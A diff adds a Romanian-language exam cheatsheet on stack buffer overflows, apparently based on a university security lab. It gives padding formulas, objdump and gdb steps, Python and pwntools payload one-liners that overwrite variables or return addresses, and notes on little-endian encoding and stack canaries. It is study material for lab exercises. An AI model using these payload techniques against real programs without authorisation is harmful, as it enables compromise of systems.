@@ -148,3 +148,118 @@ main2: main.c
 - „Fără a modifica fișierul X" → soluția e în Makefile sau în modul de rulare, nu în X.
 - „Executabilul trebuie să conțină și codul din file.c" → file.c trebuie linkat, nu ocolit.
 - „Adăugați o regulă în Makefile" → nu strici regulile existente, adaugi una nouă.
+
+# Subiectul 3 — Cheatsheet Buffer Overflow (bazat pe lab-10 HSI)
+
+Pentru task-urile gen „populate the right variable", „You got the key!", „canary".
+Ideea: scrii dincolo de buffer și aterizezi fix peste o variabilă sau peste adresa
+de retur.
+
+---
+
+## Harta stivei (scrisul în buffer merge spre ADRESE MARI, adică în jos în listă)
+
+```
+buffer[]            rbp - N     <-- scrii de aici
+alta variabila      rbp - M     <-- tinta (daca vrei o variabila)
+saved rbp           rbp + 0
+adresa de retur     rbp + 8     <-- tinta (daca vrei sa sari intr-o functie)
+```
+(pe 32 de biti: ebp, saved ebp la ebp+0, adresa de retur la ebp+4)
+
+---
+
+## FORMULA
+
+**Suprascriere variabila:**
+```
+padding = (offset buffer fata de rbp) - (offset variabila fata de rbp)
+payload = padding octeti umplutura ('A') + valoarea dorita in LITTLE-ENDIAN
+```
+Exemplu din lab: buffer la rbp-96, variabila la rbp-12  ->  96-12 = 84
+payload = 84 * 'A' + 0x5541494D (little-endian).
+
+**Suprascriere adresa de retur (sari intr-o functie "win"):**
+```
+padding = (offset buffer fata de rbp) + 8      ; +4 pe 32 de biti
+payload = padding * 'A' + adresa_functie in LITTLE-ENDIAN (8 octeti pe 64b)
+```
+
+---
+
+## Pas cu pas
+
+1. Dezasamblezi:
+   ```bash
+   objdump -M intel -d binar | less
+   ```
+2. In functia vulnerabila gasesti:
+   - buffer-ul: `lea rax, [rbp - 0x60]` dat lui gets/fgets/scanf  -> buffer la -96
+   - tinta: `cmp dword [rbp - 0xc], 0x...`                         -> variabila la -12
+   sau, in gdb:
+   ```bash
+   gdb ./binar
+   (gdb) break functie
+   (gdb) run
+   (gdb) p &buffer
+   (gdb) p &variabila      # padding = adresa_buffer - adresa_variabila (cu semn invers)
+   ```
+3. Calculezi padding-ul cu formula.
+4. Construiesti payload-ul (vezi mai jos).
+5. Il dai pe stdin.
+
+---
+
+## Generare payload (Python)
+
+```python
+import sys
+padding = b'A' * 84                              # din formula
+target  = (0x5541494D).to_bytes(4, 'little')     # 4 octeti pe 32b
+# pe 64 de biti pentru o adresa:  (0x401156).to_bytes(8, 'little')
+sys.stdout.buffer.write(padding + target)
+```
+```bash
+python3 gen.py > payload
+./binar < payload
+```
+
+Varianta intr-o linie:
+```bash
+python3 -c "import sys;sys.stdout.buffer.write(b'A'*84+(0x5541494D).to_bytes(4,'little'))" | ./binar
+```
+
+pwntools (daca e disponibil):
+```python
+from pwn import *
+payload = b'A'*84 + p32(0x5541494D)     # p64(...) pe 64 de biti
+```
+
+---
+
+## Little-endian — atentie
+Valoarea 0x5541494D se scrie in memorie ca octetii  4D 49 41 55  (ordinea inversa).
+De aceea folosesti .to_bytes(..., 'little') / p32 / p64.
+Truc: uneori valoarea-tinta e text ASCII deghizat in hex (0x5541494D = "MAIU" citit
+invers) - converteste ca sa intelegi ce "parola" se astepta.
+
+---
+
+## Canary (cand overflow-ul da "stack smashing detected")
+Semn in disassembly: `mov rax, fs:0x28` la intrare + `__stack_chk_fail` la iesire.
+- E o valoare aleatoare intre buffer si adresa de retur, verificata la iesire.
+- Daca tinta ta e o variabila locala DINAINTEA canary-ului, nu-l atingi -> merge.
+- Daca trebuie sa treci de el, payload-ul trebuie sa contina valoarea EXACTA a
+  canary-ului (o afli in gdb) pe pozitia lui.
+- La compilare: `-fno-stack-protector` il dezactiveaza, `-fstack-protector` il pune.
+
+---
+
+## Functii vulnerabile de recunoscut in cod
+gets, strcpy, strcat, sprintf, scanf("%s"), fgets cu dimensiune mai mare decat buffer-ul,
+memcpy cu lungime necontrolata.
+
+## Legatura cu enunturile de examen
+- "populate the right variable" / "You got the key!" -> suprascriere variabila (formula 1)
+- nume cu "canary"  -> tinta e inaintea canary-ului SAU incluzi canary-ul in payload
+- "passcheck" / parola simpla  -> NU e overflow, foloseste ltrace/strings
